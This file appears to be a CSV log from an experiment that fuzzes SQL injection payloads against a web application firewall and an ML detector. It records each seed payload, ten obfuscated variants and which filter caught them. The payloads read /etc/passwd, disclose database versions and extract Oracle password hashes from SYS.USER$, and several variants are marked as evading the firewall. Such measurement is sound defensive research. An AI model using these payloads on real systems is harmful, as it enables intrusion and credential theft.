Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
1,2025-10-23T16:02:53.111056," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",403,403,200,waf_correct_ml_incorrect," union SElect (SELECT 1),load_file  (/**/ '/etc/passwd'  )
 ,1,'3' NOT LIKE '3^', AND 1;",2025-10-23T16:03:16.621413,403,403,both_correct," union	sElECT (SeLECT 0x1),load_file  (  '/etc/passwd'  )
 ,1,'3093= AND 1' not like '3^', aNd 1;",2025-10-23T16:03:42.675881,403,403,both_correct," union	SeLECT (SEleCt 0x1),load_file /*S5`P	*/(  '/etc/passwd'  )	 ,1,' OR 0= AND 1' not like ''&UJ	' NOT LIKE '&UJ	:'^', AND (SELECT 1);",2025-10-23T16:04:08.726275,403,403,both_correct," union	selEcT (SelecT 0x1),load_file  (  '/etc/passwd'  )	 ,(SELECT 0x1),' OR 'p1' LIKE 'p1'= AND 1' not like ''&UJ	' NOT LIKE '&UJ	:'^', aNd (SELECt 1);",2025-10-23T16:04:33.208833,403,403,both_correct," union	SElect (selECt 0x1),load_file  (  '/etc/passwd'  )	 ,(Select 0x1),' OR 'p1' LIKE/**/'p1'= AND (SELECT '8A~'!='8A~I')' not like ''&UJ	'	NOT LIKE '&UJ	:'^', aND (sElEct 0x1);",2025-10-23T16:04:59.265271,403,403,both_correct," union	SelECT (SElECT 0x1),load_file  (  '/etc/passwd'  )
 ,(SElECT 0x1),' OR 'p1' LIKE/*E=a*/'p1'= AND (SELECT '8A~'!='8A~I')' not/**/like ''&UJ	'	NOT LIKE '&UJ	:'^', and (SEleCT 0x1);",2025-10-23T16:05:25.317461,403,403,both_correct," union	SELect (selECt 0x1),load_file  (  '/etc/passwd'  )  ,(selEcT 0x1),' OR/**/'p1' LIKE/*E=a*/'p1'= AND (SELECT '8A~'!='8A~I')' not/*~aUy*/lIKE ''&UJ	'	NOT LIKE '&UJ	:'^', aNd (seLect 0x1);",2025-10-23T16:05:51.372202,403,403,both_correct," union	selECT (SElECT 0x1),load_file  (  '/etc/passwd'  )/**/ ,(sELect 0x1),' OR/*DG*/'p1' LIKE/*E=a*/'p1'= AND (SELECT '8A~'!='8A~I')' not/**/lIke ''&UJ	' NOT LIKE '&UJ	:'^', AND (SeLect 0x1);",2025-10-23T16:06:17.417688,403,403,both_correct," union	SelECt (sELEct 0x1),load_file  (  '/etc/passwd'  )/*@*/ ,(sELEcT 0x1),' OR/**/'p1' LIKE/*E=a*/'p1'= AND/**/(SELECT '8A~'!='8A~I')' not/**/LIKE ''&UJ ' NOT LIKE '&UJ	:'^', ANd (SEleCT 0x1);",2025-10-23T16:06:43.464660,403,403,both_correct," union	seLEcT (sElecT 0x1),load_file  (  '/etc/passwd'  )/*@*/ ,(SELeCT 0x1),' OR/*<
*/'p1' LIKE/*E=a*/'p1'= AND/**/(SELECT '8A~'!='8A~I')' not/**/LIkE ''&UJ/**/' NOT LIKE '&UJ
:'^', anD (SelECT 0x1);",2025-10-23T16:07:09.521669,403,403,both_correct
2,2025-10-23T16:07:35.571826," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",403,403,403,both_correct," SElEct * FroM users WHeRE id  =  '(SELECT 1)' or @ @1  =  1 union SeleCT/**/336 NOT LIKE 337,version  ( 	  )   -- (SELECT 1)'	v",2025-10-23T16:08:00.623774,403,403,both_correct," SEleCt * FrOM users wHerE/**/id  =  '(SELECT (SELECT 1))' oR @ @1   like	  1 union SeLect/**/'C' lIKE 'C' NOT LIKE 337,version  ( 	  )   -- (SELECT 0x1)'	v",2025-10-23T16:08:26.677463,403,403,both_correct," SElect * FroM users WHerE id  =  '(SELECT
(SELECT 7101 NOT LIKE 7102))' or @ @0x1   lIkE	  1 union sElEcT/**/'C' lIke 'C' not like  AND 1,version  ( 	  )   -- (SELECT 0x1)'	vVF",2025-10-23T16:08:52.726797,403,403,both_correct," seLeCt * fROm users wHERE id   like   '(SELECT
(SELECT 7101 NOT LIKE 0x1bbe))' OR @ @0x1   liKE	  (SELECT 1) union	SeLEct/**/'C' LikE 'C'/**/not like  aNd '!' NOT LIKE '!x',version  ( 	  )   -- (SELECT 0x1)'	vVF{",2025-10-23T16:09:17.625393,403,403,both_correct," SELEcT * fRoM users WHerE id   liKE   '(SELECT	(SELECT (SELECT 4526)=4526 NOT LIKE 0x1bbe))' or @ @0x1   LIKe	  (sELECt  AND 1) union	SELECT 'C' LIKE 'C'/**/not like  AND '!' not like '!x',version  ( 	  )   -- (SELECT 0x1)'	vVF{z",2025-10-23T16:09:43.683019,403,403,both_correct," SeLeCt * fRoM users where id   liKE   '(SELECT (SELECT (SELECT (SELECT (SELECT 1)))='%sc'!='%scx' NOT LIKE 0x1bbe))'/**/or @ @0x1   LikE	  (SELEcT  and 1) union	seLEcT 'C' LIKe 'C'/**/not like  aNd '!' not like '!x',version  ( 	  )   -- (SELECT 0x1)'	vVF{zB",2025-10-23T16:10:09.737354,403,403,both_correct," selECt * FROm users WHERe id   LiKe   '(SELECT (SELECT (SELECT (SELECT (SELECT  OR '?p'='?p')))='%sc'!='%scx' NOT LIKE 0x1bbe))' OR @ @0x1   lIKe	  (SeleCT  AnD (SELECT 1)) union	select 'C' lIke 'C'/**/not like  aND '!' not like '!x',version  (    )   -- (SELECT 0x1)'	vVF{zB>",2025-10-23T16:10:34.867588,403,403,both_correct," sELeCT * FrOm users wHerE id   LiKE   '(SELECT (SELECT (SELECT (SELECT (SELECT  OR '?p'='?p')))='%sc'!='%scx' NOT LIKE 0x1bbe))' Or @ @0x1   lIKe   (selECt  and (seLeCT 0x1)) union	SELecT '{X'='{X'/**/not like  and/**/'!' not like '!x',version  (    )   -- (SELECT 0x1)'	vVF{zB>",2025-10-23T16:11:00.926466,403,403,both_correct," sElEct * fRoM users whERE id   lIKE   '(SELECT (SELECT
(SELECT (SELECT (SELECT  OR '?p'='?p')))='%sc'!='%scx' NOT LIKE 0x1bbe))' or @ @0x1   Like   (SeleCT  aND (seleCt 0x1)) union	selecT '{X' LIKE '{X'/*uG!*/not like  and '!' not like '!x',version  (    )   -- (SELECT 0x1)'	vVF{zB>",2025-10-23T16:11:26.978634,403,403,both_correct," SeLECT * FrOM users Where id   Like   '(SELECT (SELECT (SELECT (SELECT (SELECT  OR '?p'='?p')))='%sc'!='%scx' NOT LIKE 0x1bbe))' or @ @0x1   like   (seleCt  AND (SELect 0x1)) union	SeLEcT '{X' LiKe '{X'/*/KQ*/not like  And '!' not/**/LIKe '!x',version  (    )   -- (SELECT 0x1)'	vVF{zB>",2025-10-23T16:11:52.748899,403,403,both_correct
3,2025-10-23T16:12:18.794549,insert,403,200,403,waf_incorrect_ml_correct,iNsErT,2025-10-23T16:12:43.846713,200,403,waf_incorrect_ml_correct,iNSERt,2025-10-23T16:13:09.895365,200,200,both_incorrect,iNsert,2025-10-23T16:13:35.781796,200,403,waf_incorrect_ml_correct,INsErt,2025-10-23T16:14:01.830356,200,403,waf_incorrect_ml_correct,InSErt,2025-10-23T16:14:27.875492,200,403,waf_incorrect_ml_correct,iNSErT,2025-10-23T16:14:53.919800,200,200,both_incorrect,INSert,2025-10-23T16:15:18.281665,200,403,waf_incorrect_ml_correct,INSerT,2025-10-23T16:15:44.334039,200,403,waf_incorrect_ml_correct,iNSeRt,2025-10-23T16:16:10.378987,200,403,waf_incorrect_ml_correct,inSeRT,2025-10-23T16:16:36.426393,200,200,both_incorrect
4,2025-10-23T16:17:01.455716,1 and user_name  (    )     =   'dbo',403,403,403,both_correct," AND 1 And user_name  (    )      like /**/ 
'dbo'",2025-10-23T16:17:26.511628,403,403,both_correct," && (SELeCT '{' NOT LIKE '{-') AnD user_name  (    )      lIke   	'dbo'",2025-10-23T16:17:52.564404,403,403,both_correct," && (sElect '{' not like '{-')/**/AnD user_name  (    )  	   liKE   	'dbo'",2025-10-23T16:18:18.619111,403,403,both_correct,"  and  (sElECT '{' not like '{-') And user_name  (   
)  	   LiKe   	'dbo'",2025-10-23T16:18:43.754094,200,403,waf_incorrect_ml_correct," /**/and  (SELECt '{' not like '{-') And user_name  (   
)  	   Like   
'dbo'",2025-10-23T16:19:09.803962,200,403,waf_incorrect_ml_correct," /*J97t	*/&&  (SeLEcT '{' not like '{-') ANd user_name  (    )  	   LIKe/**/  
'dbo'",2025-10-23T16:19:35.853472,403,403,both_correct," /*w*/ AND   (sElEcT '{' not like '{-') And user_name  (   	)  	   LiKe   
'dbo'",2025-10-23T16:19:58.948606,200,403,waf_incorrect_ml_correct," /**/ And  	(sElect '{' not like '{-') ANd user_name/**/ (   	)  	   LiKe   
'dbo'",2025-10-23T16:20:16.220618,200,403,waf_incorrect_ml_correct," /**/ anD  	(SELECT '{' not like '{-') AnD user_name/**//**/(   	)  	   LIkE    'dbo'",2025-10-23T16:20:33.412709,200,403,waf_incorrect_ml_correct," /**/ aNd
 	(SelECt '{' not like '{-') AnD user_name /**/(   	)  	   lIKe    'dbo'",2025-10-23T16:20:50.685883,403,403,both_correct
5,2025-10-23T16:21:08.158908," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",403,403,403,both_correct," sElECt * frOM users WherE id/**/  like   1 OR ""%["" Or (SELECT 1479)<>1480  =   or 0	-- 1ZA",2025-10-23T16:21:24.546129,403,403,both_correct," SeLECt * FrOM users Where id/*=h<*/ 
lIKe   '
'<>'
e'/**/or ""%["" oR (SElEcT (SeleCt (SELECT 1)))<>1480  =   Or 0	-- 1ZA",2025-10-23T16:21:44.041517,403,403,both_correct," sELEct * FrOM users Where id/*Sm*/ 
liKe   '
'<>'
e' or ""%["" or (selECT (sELECT (seLEcT 1)))<>(sELecT  AND 1)  =   oR 6546 IN (6545,6546,6547) -- 1ZA",2025-10-23T16:22:00.781778,403,403,both_correct," sELeCT * FRom users wherE/*MhZn*/id/*Sm*/ 
LiKE   '	'<>'
e' or ""%["" or (SElEcT (SeLEct (SelEcT 0x1)))<>(SelECt  and 'Q:a' LIke 'Q:a')  =   or  OR 0 IN (6545,6546,6547) -- 1ZA",2025-10-23T16:22:18.574922,403,403,both_correct," SeLeCt * FROM users WheRe/*MhZn*/id/*Sm*/ 
lIKe /**/ '
'<>'
e' or ""%["" or (sElEcT (sELecT (SELeCt 0x1)))<>(seLect  aND 'Q:a' LIkE 'Q:a')  =   oR  OR (sELecT 0) In ( AnD 1,2566<>2567,6547) -- 1ZAg4",2025-10-23T16:22:36.122868,403,403,both_correct," SeLeCT * FRom users WheRe/*MhZn*/id/*Sm*/ 
LIke /**/ '
'<>'
e' or ""%["" Or (seLEcT
(seLeCT (seleCt 0x1)))<>(sEleCT  ANd 'Q:a' liKe 'Q:a')  =   OR  || (sElECT 0) In ( anD (seleCt (SELECT 5279) NOT LIKE 5280),2566<>2567,6547)/**/-- 1ZAg4W-",2025-10-23T16:22:54.057849,403,403,both_correct," selEcT * FrOM users wHeRE/**/id/*Sm*/ 
LIke /**/ '	'<>'
e' or ""%["" Or (SeLecT
(SelEct (sElECt 0x1)))<>(seLECt  anD 'Q:a' LikE 'Q:a')  =   ||  || (seLECt (SelecT 1)) IN ( AnD (SELeCt (sELEcT 5279) NOT LIKE 5280),2566<>(selECt/**/'9`""X' lIKe '9`""X'),6547)/*<{&*/-- 1ZAg4W-",2025-10-23T16:23:11.802097,403,403,both_correct," seLecT * fRoM users WhERe/**/id/*Sm*/ 
LIKe /**/ '	'<>'
e' or ""%["" oR (sElect	(SeLEct (sEleCt 0x1)))<>(SelEcT  And 'Q:a' lIKE 'Q:a')   like    ||  || (SELEcT (SELecT/**/1)) IN ( and (sElecT (SeLEcT  OR 0x0) NOT LIKE 5280),2566<>(SElEct/**/'9`""X' Like '6774!=6775`""X'),6547)/*<{&*/-- 1ZAg4W-u~",2025-10-23T16:23:28.057405,403,403,both_correct," SelECt * FrOm users whEre/**/id/*Sm*/	
like   '	'<>'
e' OR ""%["" Or (selECT	(sElecT (SELecT 0x1)))<>(selECT  And 'Q:a' lIKe 'Q:a')   LiKe    ||  || (SElECt (Select/**/1)) iN ( and (sElECT (SeLeCt  or 0x0) not like 5280), oR 0<>(Select/*I=*/'9`""X' Like '(SELECT 6774)!=6660 IN (6659,6660,6661)`""X'),6547)/*<{&*/-- 1ZAg4W-u~",2025-10-23T16:23:45.065837,403,403,both_correct," SelECt * FrOm users wherE/**/id/*Sm*/	
LiKe   '	'<>'	e' Or ""%["" OR (SELEcT	(sELeCT (SeLEct 0x1))) not like (SELecT  anD 'Q:a' liKE 'Q:a')   liKe    ||  || (sEleCT (SElect/**/ aNd 1)) in ( aND (sELeCT (seLEcT  oR 0x0) not like (SeLeCt 5280)), OR 0<>(SelEcT/*I=*/'9`""X' LIke '(SELECT 6774)!=6660/**/IN (6659,6698<>6699,6661)`""X'),6547)/*<{&*/-- 1ZAg4W-u~@",2025-10-23T16:24:02.953240,403,403,both_correct
6,2025-10-23T16:24:20.180420,"or 0  =  0 #""",403,200,200,both_incorrect,"OR 'nkm' NOT LIKE 'nkm='/**/ = 	0x0 #""M&",2025-10-23T16:24:36.444794,200,403,waf_incorrect_ml_correct,"Or 'nkm' not like 'nkm='  = 	0x0
#""M&%",2025-10-23T16:24:55.360498,200,200,both_incorrect,"oR 'nkm' not/*EB^*/like 'nkm=' 
 LIKE  	0x0
#""M&%",2025-10-23T16:25:13.200853,200,403,waf_incorrect_ml_correct,"Or/**/'nkm' not/*EB^*/like
'nkm=' 
 lIKe  	0x0
#""M&%A
",2025-10-23T16:25:31.152309,200,403,waf_incorrect_ml_correct,"or 'nkm' not/**/liKe
'nkm=' 
 LIKe  	0x0	#""M&%A
",2025-10-23T16:25:47.941273,200,403,waf_incorrect_ml_correct,"Or 'nkm' not/*Ot*/lIKe/**/'nkm=' 
 LIKe  	0x0	#""M&%A
",2025-10-23T16:26:05.624577,200,403,waf_incorrect_ml_correct,"oR 'nkm' not/*EN1@?*/Like/**/'nkm=' 
 likE/**/		0x0	#""M&%A
",2025-10-23T16:26:22.455757,200,403,waf_incorrect_ml_correct,"Or 'nkm'/**/not/*EN1@?*/LIKe/**/'nkm=' 
 lIke/**/ 	0x0	#""M&%A
A@",2025-10-23T16:26:40.840803,403,403,both_correct,"or 'nkm'/**/not/*EN1@?*/LIKE/*HrR*/'nkm='	
 liKe/**//**/	0x0	#""M&%A
A@",2025-10-23T16:26:57.542284,403,403,both_correct,"or 'nkm' not/*EN1@?*/LikE/*/4G*/'nkm='	
 LIkE/**//**/	0x0	#""M&%A	A@",2025-10-23T16:27:15.493606,200,403,waf_incorrect_ml_correct
7,2025-10-23T16:27:33.634818,PRINT,403,200,200,both_incorrect,PRINT,2025-10-23T16:27:52.830508,200,200,both_incorrect,PRINT,2025-10-23T16:28:10.304354,200,200,both_incorrect,PRINT,2025-10-23T16:28:28.195055,200,200,both_incorrect,PRINT,2025-10-23T16:28:46.279993,200,200,both_incorrect,PRINT,2025-10-23T16:29:03.658813,200,200,both_incorrect,PRINT,2025-10-23T16:29:21.447934,200,200,both_incorrect,PRINT,2025-10-23T16:29:39.005046,200,200,both_incorrect,PRINT,2025-10-23T16:29:56.039531,200,200,both_incorrect,PRINT,2025-10-23T16:30:13.528307,200,200,both_incorrect,PRINT,2025-10-23T16:30:31.403897,200,200,both_incorrect
8,2025-10-23T16:30:49.296768,or 1 --',403,200,200,both_incorrect,"Or
0x1/*N1*/--'",2025-10-23T16:31:06.417712,200,403,waf_incorrect_ml_correct,"OR
0x1	--'",2025-10-23T16:31:25.495288,200,200,both_incorrect,"OR/**/0x1	--'",2025-10-23T16:31:44.042776,200,403,waf_incorrect_ml_correct,or 0x1 --',2025-10-23T16:32:01.225912,200,200,both_incorrect,"||/**/0x1
--'",2025-10-23T16:32:18.050470,200,403,waf_incorrect_ml_correct,||/**/0x1/**/--',2025-10-23T16:32:35.516241,200,403,waf_incorrect_ml_correct, or  0x1/**/--',2025-10-23T16:32:55.913550,200,403,waf_incorrect_ml_correct,"	or  0x1 --'",2025-10-23T16:33:13.332434,200,200,both_incorrect,"
Or  0x1/**/--'",2025-10-23T16:33:30.525929,200,403,waf_incorrect_ml_correct,"	or/**/ 0x1/*`*/--'",2025-10-23T16:33:56.577996,200,403,waf_incorrect_ml_correct
9,2025-10-23T16:34:13.273444,select * from users where id  =  1 or \<$ or 1  =  1 -- 1,403,403,403,both_correct,"SElECt * FRoM users WHere id  = 	'd' LikE 'd' or \<$ Or 1/**/  LIKE   1 -- (SELECT (SELECT 1))m*",2025-10-23T16:34:30.355879,403,403,both_correct,SeLecT * FRom users wHerE id  =  'd' lIKE 'd' || \<$/**/or 0x1/**/  lIKE   (SELECT 1) -- (SELECT (SELECT 'x'='x'))m*,2025-10-23T16:34:48.370485,403,403,both_correct,"selEcT * FRom users wHERE id  =  ':G'=':G'  OR  \<$ or 0x1/**/  lIke   (select (sElecT 0x1)) -- (SELECT	(SELECT 'x'='x'))m*",2025-10-23T16:35:06.029355,403,403,both_correct,"SELecT * From users wHERe id   like   ':G'=':G'  oR
 \<$ OR 0x1   liKe   (select (seLeCT 0x1)) -- (SELECT	(SELECT '}' LIKE '}'))m*",2025-10-23T16:35:23.154516,403,403,both_correct,"seLEct * fRoM users WheRe id   like   ':G'=':G'  oR  \<$ or 0x1   LiKE   (SeLEct (SelEcT/**/0x1)) -- (SELECT	(SELECT '}' LIKE '}'))m*",2025-10-23T16:35:40.060130,403,403,both_correct,"selecT * froM users WHERE id   likE   ':G'=':G'  Or  \<$ oR 0x1   LIkE   (SELeCt (selEct 0x1)) -- (SELECT
(SELECT '}' like '}'))m*",2025-10-23T16:35:57.163037,403,403,both_correct,sElECT * FROm users wHeRE id   lIKe   ':G'/**/LikE ':G'  OR  \<$ oR 0x1   LIKE   (SeleCt (seLEcT 0x1)) -- (SELECT (SElEct '}' LiKe '}'))m*,2025-10-23T16:36:14.732327,403,403,both_correct,"SeLEct * frOM users whERE id   like   ':G'/**/LikE ':G'  Or  \<$ oR 0x1   LikE   (SeleCT (SElect 0x1)) -- (SELECT (SElEct/**/'}' LiKe	'}'))m*Pf",2025-10-23T16:36:31.749200,403,403,both_correct,"sELect * FROm users wHeRe id   LiKE   ':G'/**/LikE ':G'	 or  \<$ or 0x1   liKE   (SElect (seLECT 0x1)) -- (SELECT (SElEct '}' LiKe	'}'))m*Pf",2025-10-23T16:36:48.913483,403,403,both_correct,"seLeCT * FRoM users whERE id  /*J89F*/liKE   ':G'/**/lIKe ':G'  OR  \<$ or 0x1   LiKE   (SeleCt (SeLect 0x1)) -- (SELECT (SElEct '}' LiKe	'}'))m*Pf",2025-10-23T16:37:06.056128,403,403,both_correct
10,2025-10-23T16:37:22.820523," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",403,403,403,both_correct,"/**/And (SELECT 1)  =  utl_inaddr.get_host_address   (    (   seLecT distINCT  (  PASSWORD  )   frOm   (  SelecT disTiNCt  (  PASSWORD  ) 	, ROWNUM As LIMIT FROM SYS.USER$  )   wHere LIMIT   LIKE   6362 Like  AND 1   )    )    And 'i'  =  'i",2025-10-23T16:37:39.371412,200,403,waf_incorrect_ml_correct,"/**/And (sELeCt (sELect 'Ht+' LIKE 'Ht+'))   like   utl_inaddr.get_host_address   (    (/**/  SeLeCT DISTInCT  (  PASSWORD  )   FrOm   (  SElECT DIsTiNCt  (  PASSWORD  )  , ROWNUM as LIMIT from SYS.USER$  )   WHERe LIMIT   lIke   6362 LIke  And (SElecT 1)   )    )    aNd 'i'  =  'i",2025-10-23T16:37:56.934235,200,403,waf_incorrect_ml_correct,"/**/aNd (SElEct (sEleCT 'Ht+' LIke 'Ht+'))   like   utl_inaddr.get_host_address   (    (/*f
)*/  sELecT DiSTINCt  (  PASSWORD  )   from   (  Select diSTiNcT  (  PASSWORD  )  , ROWNUM as LIMIT FrOm SYS.USER$  )   WhERE LIMIT 	 LiKe   0x18da LiKE  And (sElecT  OR 0)   )    ) /**/  aND 'i'   LiKE   'i",2025-10-23T16:38:14.849618,200,403,waf_incorrect_ml_correct,"/**/and (seLEcT (SeLect 'Ht+' lIke 'Ht+'))   lIKe   utl_inaddr.get_host_address   (   	(/*f
)*/  SelEcT dIstinCt  (  PASSWORD  )   froM   (  SelECt DIsTiNct  (  PASSWORD  )  , ROWNUM as LIMIT fROM SYS.USER$  )   wHere LIMIT 	 liKe   0x18da LIKe  and (sElect  or 0x15a4<> aNd 1)   )    ) /* J*//**/ ANd 'i'   lIKe   'i",2025-10-23T16:38:31.453475,200,403,waf_incorrect_ml_correct,"/**/ANd (sELect (sElECt 'Ht+' LIke 'Ht+'))   liKE   utl_inaddr.get_host_address   (   	(/*f )*/  SelECt DistINCt  (  PASSWORD  )   FROm   (  sELEcT DISTInCt  (  PASSWORD  )  , ROWNUM as LIMIT frOm SYS.USER$  )   wherE LIMIT 	 Like   0x18da lIKE  ANd (SelECT  oR 0x15a4<> aND 0x1)   )    )  /*	*/ and 'i'   LIkE   'i",2025-10-23T16:38:53.739513,200,403,waf_incorrect_ml_correct,"/**/aNd (seLEct (Select 'Ht+' LiKe 'Ht+'))   LIkE   utl_inaddr.get_host_address   (   	(/*f )*/  Select dIstinct  (  PASSWORD  )/**/  FRoM   (  SeLECT dISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHere LIMIT 	 LIke   0x18da liKE  AnD (SelECt  Or 0x15a4!= and 0x1)   )    )  /*
*/ ANd 'i'   LiKE   'i",2025-10-23T16:39:10.766322,200,403,waf_incorrect_ml_correct,"/**/ANd (SELect (sEleCt 'Ht+' lIKe 'Ht+'))   lIke   utl_inaddr.get_host_address   (   	(/*f )*/  SeLECt DiSTinct  (  PASSWORD  )/**/  From   (	 SeLEct dISTINcT  (  PASSWORD  )  , ROWNUM as LIMIT froM SYS.USER$  )   where LIMIT 	 like   0x18da LiKE  anD (seLEct  Or 0x15a4<> aND 0x1)   )    )  /**/ AnD/*}'qJ'<>'qJp'*/'i'   LIKE   'i",2025-10-23T16:39:28.209588,200,403,waf_incorrect_ml_correct,"/**/aNd (SELECt (SEleCt 'Ht+' LIkE 'Ht+'))   lIKe   utl_inaddr.get_host_address   (    (/*f )*/  sELecT DiStINct  (/**/ PASSWORD  )/**/  FROm   (	 SeleCt diSTinCt  (  PASSWORD  )  , ROWNUM aS LIMIT FRom SYS.USER$  )   wheRe LIMIT 	 LikE   0x18da lIKE  AnD (SELeCT  Or 0x15a4<> ANd 0x1)   )    )  /**/ anD/**/'i'   lIKE   'i",2025-10-23T16:39:45.594645,200,403,waf_incorrect_ml_correct,"/**/ANd (SElECt (SELecT 'Ht+' likE 'Ht+'))   likE   utl_inaddr.get_host_address   (    (/*f )*/  selecT diStinct  (/**/ PASSWORD  )/**/  frOm   (  selECt dIsTINct  (  PASSWORD/**/ )  , ROWNUM as LIMIT frOm SYS.USER$  )   wHeRe LIMIT 	 LikE   0x18da lIKe  ANd (sELEct  oR 0x15a4 not like  anD 0x1)   )    )  /**/ AnD/**/'i'   lIkE   'i",2025-10-23T16:40:02.382621,200,403,waf_incorrect_ml_correct,"/**/anD (seleCT (SeLECt 'Ht+' LiKE 'Ht+'))   likE   utl_inaddr.get_host_address   (    (/*f )*/  SELecT DiSTinCT  (/**/ PASSWORD  )/**/  FRoM   (  sElECt disTinCT  (  PASSWORD  )  , ROWNUM As LIMIT FROM SYS.USER$  )   WheRe LIMIT 	 LIKE   0x18da LIKe  anD (sElecT  or 0x15a4 not like  and 0x1)   )    ) 
/**/ aND/**/'i'   liKe   'i",2025-10-23T16:40:19.089779,200,403,waf_incorrect_ml_correct
